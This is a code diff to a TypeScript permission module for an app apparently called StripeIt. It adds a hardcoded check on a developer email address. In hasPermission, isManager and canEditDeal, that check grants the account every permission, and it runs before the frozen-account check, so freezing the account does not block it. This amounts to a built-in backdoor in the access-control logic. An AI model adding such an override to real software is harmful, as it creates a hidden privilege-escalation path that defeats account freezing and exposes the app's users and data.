@@ -1,9 +1,14 @@
 import { UserProfile, UserRole } from '../types';
+import { STRIPEIT_DEVELOPER_EMAIL } from '../constants';
 
 /**
  * StripeItRolePermissionSystem
  * Centralized logic for role-based access control and fine-grained permissions.
  */
+
+const isDeveloper = (profile: UserProfile | null) => {
+  return profile?.email?.toLowerCase() === STRIPEIT_DEVELOPER_EMAIL.toLowerCase();
+};
 
 export type AppPermission = 
   | 'deals:create'
@@ -59,7 +64,9 @@ export const permissionService = {
    * Core check for any permission
    */
   hasPermission: (profile: UserProfile | null, permission: AppPermission): boolean => {
-    if (!profile || profile.isFrozen) return false;
+    if (!profile) return false;
+    if (isDeveloper(profile)) return true;
+    if (profile.isFrozen) return false;
     return rolePermissions[profile.role]?.includes(permission) || false;
   },
 
@@ -67,7 +74,9 @@ export const permissionService = {
    * Helper for manager-level checks (legacy support + convenience)
    */
   isManager: (profile: UserProfile | null): boolean => {
-    if (!profile || profile.isFrozen) return false;
+    if (!profile) return false;
+    if (isDeveloper(profile)) return true;
+    if (profile.isFrozen) return false;
     return [UserRole.MANAGER, UserRole.GENERAL_MANAGER, UserRole.ADMIN, UserRole.DEALER_OWNER].includes(profile.role);
   },
 
@@ -76,6 +85,7 @@ export const permissionService = {
    */
   isSales: (profile: UserProfile | null): boolean => {
     if (!profile) return false;
+    if (isDeveloper(profile)) return false; // Developer is considered higher level
     return profile.role === UserRole.SALES;
   },
 
@@ -84,6 +94,7 @@ export const permissionService = {
    */
   canEditDeal: (profile: UserProfile | null, dealUserId: string): boolean => {
     if (!profile) return false;
+    if (isDeveloper(profile)) return true;
     // Users can edit their own deals, Managers/Admins can edit any deal via edit_any permission
     return profile.uid === dealUserId || permissionService.hasPermission(profile, 'deals:edit_any');
   }
